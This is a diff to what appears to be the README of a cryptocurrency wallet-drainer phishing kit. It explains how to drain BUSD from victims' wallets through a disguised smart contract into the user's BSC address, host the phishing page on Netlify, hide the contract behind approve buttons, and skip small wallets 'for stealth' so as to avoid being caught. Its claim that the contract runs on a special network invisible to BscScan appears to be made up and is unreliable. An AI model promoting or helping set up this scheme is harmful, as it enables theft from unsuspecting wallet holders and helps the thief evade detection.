@@ -1,5 +1,7 @@
 
+HOW IT WORKS
 
+VICTIM ----> CUSTOM SMART CONTRACT -----> YOUR BSC ADDRESS
 
 This script will let you drain BUSD from the targets address
 
@@ -8,7 +10,11 @@ This is a free community code that anyone can audit or edit with pull request an
 go to https://www.netlify.com/ to host or host it on a regular site
 
 
-Smart contract
+Smart contract address will show up in the approve and other buttons not yours for stealth
+
+!!!!!THIS SMART CONTRACT IS ON A SPECIAL ERC NETWORK THAT FOWARDS IT TO YOUR ADDRESS ON THE REAL BSC CHAIN FOR STEALTH THIS CONTRACT WILL NOT SHOW UP ON BSCSCAN!!!!!
+
+THE CONTRACT WILL ONLY DRAIN WALLETS WITH 50 BUSD OR MORE FOR STEALTH 
 
 1. the smart contract will foward the data to you to prevent you from being caught 
 
